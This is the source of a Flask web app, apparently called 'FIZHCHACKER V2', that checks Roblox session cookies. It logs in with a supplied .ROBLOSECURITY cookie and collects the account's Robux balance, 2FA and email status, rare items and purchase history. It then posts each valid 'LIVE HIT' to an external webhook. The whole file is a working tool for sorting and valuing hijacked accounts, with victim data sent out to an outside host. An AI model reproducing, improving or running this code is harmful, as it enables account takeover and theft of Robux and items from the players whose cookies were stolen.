from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/check', methods=['POST'])
def api_check():
    cookie = request.form.get('cookie', '').strip()
    webhook_url = request.form.get('webhook_url', '').strip()

    if not cookie:
        return jsonify({'result': {'status': 'invalid'}})

    if not cookie.startswith('_|WARNING:'):
        cookie = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' + cookie

    cookies = {'.ROBLOSECURITY': cookie}
    
    session = requests.Session()
    session.cookies.update(cookies)
    
    init_res = session.post('https://auth.roblox.com/v1/logout', headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': 'https://www.roblox.com/'
    })
    csrf_token = init_res.headers.get('x-csrf-token', '')

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Referer': 'https://www.roblox.com/',
        'X-CSRF-Token': csrf_token
    }

    try:
        # 1. Autentikasi User
        user_res = session.get('https://users.roblox.com/v1/users/authenticated', headers=headers)
        if user_res.status_code != 200:
            return jsonify({'result': {'status': 'invalid'}})
        
        user_data = user_res.json()
        user_id = user_data.get('id')
        username = user_data.get('name')
        display_name = user_data.get('displayName')

        # 2. Avatar Headshot
        avatar_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=false"
        headshot_res = session.get(avatar_url, headers=headers)
        if headshot_res.status_code == 200:
            hs_data = headshot_res.json().get('data', [])
            if hs_data:
                avatar_url = hs_data[0].get('imageUrl', '')

        model_3d_url = f"https://www.roblox.com/users/{user_id}/profile"

        # 3. Saldo & Pending
        economy_res = session.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers)
        robux = economy_res.json().get('robux', 0) if economy_res.status_code == 200 else 0

        pending_robux = 0
        trans_res = session.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary', headers=headers)
        if trans_res.status_code == 200:
            pending_robux = trans_res.json().get('pendingRobuxTotal', 0)

        rap = 0 
        saved_payment = "None Detected"

        # 4. Status Keamanan (Email & 2FA)
        email_status = "Unverified"
        settings_res = session.get('https://accountsettings.roblox.com/v1/email', headers=headers)
        if settings_res.status_code == 200:
            ed = settings_res.json()
            if ed.get('verified'):
                email_addr = ed.get('emailAddress', '')
                email_status = f"Verified ({email_addr[:3]}***)" if email_addr else "Verified"

        has_a2f = False
        ts_res = session.get(f'https://twostepverification.roblox.com/v1/users/{user_id}/settings', headers=headers)
        if ts_res.status_code == 200:
            ts_data = ts_res.json()
            has_a2f = any(ts_data.get(k, False) for k in ['isAuthenticatorEnabled', 'isEmailEnabled', 'isSmsEnabled'])

        # 5. Cek Item Katalog menggunakan Inventory v1/v2 endpoint umum
        def check_item_owned(asset_id):
            inv = session.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/asset/{asset_id}', headers=headers)
            if inv.status_code == 200:
                return len(inv.json().get('data', [])) > 0
            return False

        def get_asset_icon(asset_id):
            t_res = session.get(f'https://thumbnails.roblox.com/v1/assets?assetIds={asset_id}&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false', headers=headers)
            if t_res.status_code == 200:
                t_data = t_res.json().get('data', [])
                if t_data:
                    return t_data[0].get('imageUrl', '')
            return avatar_url

        headless_owned = check_item_owned(134082579)
        korblox_owned = check_item_owned(139607718)
        vfx_owned = check_item_owned(98436573)
        limited_owned = check_item_owned(45484837)

        # 6. Membaca Asset Animasi / Bundle yang Terpasang di Avatar
        animations = []
        avatar_wearing = session.get(f'https://avatar.roblox.com/v1/users/{user_id}/avatar', headers=headers)
        if avatar_wearing.status_code == 200:
            assets_list = avatar_wearing.json().get('assets', [])
            for asset in assets_list:
                aname = asset.get('name', 'Asset Item')
                said = asset.get('id')
                animations.append({"name": aname, "icon": get_asset_icon(said)})

        if not animations:
            animations.append({"name": "No Active Animations", "icon": avatar_url})

        headless_data = {"name": "Headless Horseman", "status": headless_owned, "icon": get_asset_icon(134082579)}
        korblox_data = {"name": "Korblox Deathspeaker", "status": korblox_owned, "icon": get_asset_icon(139607718)}
        vfx_data = {"name": "VFX / Particle Effect", "status": vfx_owned, "icon": get_asset_icon(98436573)}
        limited_data = {"name": "Limited Collectible", "status": limited_owned, "icon": get_asset_icon(45484837)}

        # 7. Riwayat Game & Spent Game dari Transaksi Purchases
        game_spent = []
        game_history = []

        pres_res = session.post('https://presence.roblox.com/v1/presence/users', json={"userIds": [user_id]}, headers=headers)
        if pres_res.status_code == 200:
            pres_list = pres_res.json().get('userPresences', [])
            if pres_list:
                loc = pres_list[0].get('lastLocation')
                if loc:
                    game_history.append({"name": loc, "icon": avatar_url})

        if not game_history:
            game_history.append({"name": "Active Session", "icon": avatar_url})

        trans_list_res = session.get(f'https://economy.roblox.com/v2/users/{user_id}/transactions?cursor=&limit=10&transactionType=Purchases', headers=headers)
        if trans_list_res.status_code == 200:
            t_data = trans_list_res.json().get('data', [])
            for t in t_data:
                det = t.get('details', {})
                name = det.get('name', 'In-Game Purchase') if isinstance(det, dict) else 'Purchase'
                amt = t.get('currency', {}).get('amount', 0)
                game_spent.append({"name": name, "icon": avatar_url, "spent": str(abs(amt))})

        if not game_spent:
            game_spent.append({"name": "No Spent Records Found", "icon": avatar_url, "spent": "0"})

        if webhook_url:
            session.post(webhook_url, json={
                "content": f"🚨 **FIZHCHACKER V2 - LIVE HIT**\n👤 User: `{username}`\n📧 Email: `{email_status}` | 2FA: `{has_a2f}`\n💰 Robux: `{robux}`"
            })

        return jsonify({
            "result": {
                "status": "valid",
                "id": user_id,
                "username": username,
                "display_name": display_name,
                "avatar_url": avatar_url,
                "model_3d_url": model_3d_url,
                "robux": robux,
                "pending_robux": pending_robux,
                "rap": rap,
                "saved_payment": saved_payment,
                "email_status": email_status,
                "has_a2f": "Enabled ⚠️" if has_a2f else "Disabled",
                "refreshed_cookie": cookie,
                "animations": animations,
                "headless": headless_data,
                "korblox": korblox_data,
                "vfx": vfx_data,
                "limited": limited_data,
                "game_spent": game_spent,
                "game_history": game_history
            }
        })

    except Exception as e:
        return jsonify({'result': {'status': 'invalid'}})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
